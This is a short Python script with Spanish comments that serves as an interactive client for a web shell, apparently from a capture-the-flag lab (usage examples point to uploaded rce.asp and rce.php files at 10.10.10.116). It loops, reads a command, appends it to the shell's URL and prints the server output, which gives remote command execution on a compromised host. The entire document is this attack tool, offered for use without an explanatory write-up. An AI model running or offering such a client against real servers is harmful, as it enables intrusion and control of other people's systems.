import requests
import sys

if len(sys.argv) == 2:
	# En un bucle infinito hacemos rce
	while True:
		# Pedimos un comando para la RCE
		cmd = raw_input('Comando RCE: ')
		print(requests.get(url = sys.argv[1] + cmd).content)
else:
	# Como usar el script
	print("Como usar:\npython rce.py http://10.10.10.116/upload/rce.asp?cmd=\npython rce.py http://10.10.10.116/upload/rce.php?cmd=")
